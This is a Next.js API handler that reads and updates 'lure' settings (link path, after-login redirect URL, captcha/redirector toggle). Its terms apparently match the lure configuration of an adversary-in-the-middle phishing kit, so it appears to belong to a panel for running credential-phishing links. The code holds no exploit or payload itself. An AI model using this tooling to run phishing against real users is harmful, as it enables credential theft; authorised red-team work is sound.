import { NextApiRequest, NextApiResponse } from "next";
import { configService } from "@/services/configService";

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  try {
    if (req.method === "GET") {
      // Check if a specific lure index was requested
      const { lureIndex } = req.query;
      const lureIndexNum =
        lureIndex !== undefined ? Number(lureIndex) : undefined;

      console.log(
        `API /link-settings GET: Requesting settings for lure index ${lureIndexNum}`
      );

      const config = await configService.readConfig();
      if (!config) {
        return res.status(200).json({
          afterLoginRedirect: "",
          useCaptcha: true,
          linkPath: "",
        });
      }

      // Add null check for lures array
      const lures = config.lures || [];

      // Get values from the specific lure index, or first lure if no index provided
      let lure;
      if (
        lureIndexNum !== undefined &&
        lureIndexNum >= 0 &&
        lureIndexNum < lures.length
      ) {
        lure = lures[lureIndexNum];
        console.log(
          `API /link-settings GET: Using lure at index ${lureIndexNum}: ${lure.path}`
        );
      } else {
        lure = lures[0] || {};
        console.log(`API /link-settings GET: Using first lure (fallback)`);
      }

      // Get the path, removing leading slash for display in UI
      const path = lure.path || "";
      const displayPath = path.startsWith("/") ? path.substring(1) : path;

      return res.status(200).json({
        afterLoginRedirect: lure.redirect_url || "",
        useCaptcha: lure.redirector === "main",
        linkPath: displayPath, // Return without leading slash for UI display
      });
    } else if (req.method === "POST") {
      const { afterLoginRedirect, useCaptcha, linkPath, lureId, lureIndex } =
        req.body;

      console.log(
        `API /link-settings POST: Updating lure with index ${lureIndex}, id ${lureId}`
      );

      // If a specific lureIndex is provided, use that instead of lureId
      if (lureIndex !== undefined) {
        const lureIndexNum = Number(lureIndex);

        // Read the config to check if this index exists
        const config = await configService.readConfig();
        if (!config || !config.lures || !Array.isArray(config.lures)) {
          return res.status(500).json({ error: "Invalid configuration" });
        }

        // Check if the index is valid
        if (lureIndexNum < 0 || lureIndexNum >= config.lures.length) {
          return res
            .status(400)
            .json({ error: `Invalid lure index: ${lureIndexNum}` });
        }

        // We have a valid index - update that specific lure
        config.lures[lureIndexNum].redirect_url = afterLoginRedirect || "";
        config.lures[lureIndexNum].redirector = useCaptcha ? "main" : "";

        // Format the path to ensure it starts with a slash
        const formattedPath =
          linkPath && linkPath.startsWith("/")
            ? linkPath
            : `/${linkPath || ""}`;
        config.lures[lureIndexNum].path = formattedPath;

        // Write the updated config back
        const success = await configService.writeConfig(config);

        console.log(
          `API /link-settings POST: Updated lure at index ${lureIndexNum}, success: ${success}`
        );

        if (success) {
          return res.status(200).json({
            message: `Lure at index ${lureIndexNum} updated successfully`,
            lure: config.lures[lureIndexNum],
          });
        } else {
          return res
            .status(500)
            .json({ error: "Failed to update lure settings" });
        }
      }
      // Fall back to lureId if no lureIndex is provided
      else if (lureId) {
        const success = await configService.updateSpecificLureLinkSettings(
          lureId,
          afterLoginRedirect || "",
          useCaptcha || false,
          linkPath || ""
        );

        if (success) {
          return res
            .status(200)
            .json({ message: "Lure settings updated successfully" });
        } else {
          return res
            .status(500)
            .json({ error: "Failed to update lure settings" });
        }
      } else {
        // The configService will handle ensuring the path has a leading slash
        const success = await configService.updateLinkSettings(
          afterLoginRedirect || "",
          useCaptcha || false,
          linkPath || ""
        );

        if (success) {
          return res
            .status(200)
            .json({ message: "Settings updated successfully" });
        } else {
          return res.status(500).json({ error: "Failed to update settings" });
        }
      }
    } else {
      res.status(405).json({ error: "Method not allowed" });
    }
  } catch (error) {
    console.error("Error handling link settings:", error);
    res.status(500).json({ error: "Internal server error" });
  }
}
